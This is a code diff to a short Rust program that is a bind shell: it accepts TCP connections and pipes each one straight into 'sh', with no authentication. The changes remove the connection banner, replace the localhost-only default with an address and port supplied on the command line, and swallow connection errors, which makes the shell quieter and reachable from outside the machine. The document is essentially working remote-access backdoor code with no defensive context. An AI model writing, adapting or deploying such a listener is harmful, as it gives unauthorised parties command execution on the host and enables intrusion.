@@ -2,12 +2,10 @@
 use std::net::{TcpListener, TcpStream};
 use std::thread;
 use std::env;
-use std::io::{Write, Read};
 use std::process::{Command, Stdio};
 use std::os::unix::io::{AsRawFd, FromRawFd};
 
-unsafe fn handle_client(mut stream: TcpStream) {
-    stream.write("Got your connection\n".as_bytes()).unwrap();
+unsafe fn handle_client(stream: TcpStream) {
 
     Command::new("sh")
         .stdin(Stdio::from_raw_fd(stream.as_raw_fd()))
@@ -20,18 +18,28 @@ unsafe fn handle_client(mut stream: TcpStream) {
 fn main() {
 
     let args: Vec<String> = env::args().collect();
-    let mut port: i32 = 25566;
+    let mut port: i32 = 0;
+    let mut address = String::new();
 
     match args.len() {
-        1 => {} //No args provided, skip
+        1 => {
+            eprintln!("Error: Not enough not args!");
+            return;
+        }
         2 => {
-            match args[1].to_string().parse::<i32>() {
+            eprintln!("Error: Not enough not args!");
+            return;
+        }
+        3 => {
+            match args[2].to_string().parse::<i32>() {
                 Ok(n) => port = n,
                 Err(_) => {
-                    eprintln!("Error: Invalid number!");
+                    eprintln!("Error: Invalid port!");
                     return;
                 }
             };
+
+            address = args[1].to_string();
         }
         _ => eprintln!("Error: Too many args!"),
     };
@@ -41,7 +49,13 @@ fn main() {
         return;
     }
 
-    let listener = TcpListener::bind(format!("127.0.0.1:{}", port)).unwrap();
+    let listener = match TcpListener::bind(format!("{}:{}", address, port)) {
+        Ok(l) => l,
+        Err(_) => {
+            eprintln!("Error: Could not bind to {}:{}", address, port);
+            return;
+        }
+    };
 
     for connection in listener.incoming() {
         match connection {
@@ -50,7 +64,7 @@ fn main() {
                     handle_client(stream);
                 });
             }
-            Err(e) => panic!(e), 
+            Err(_) => {}
         }
     }
 }
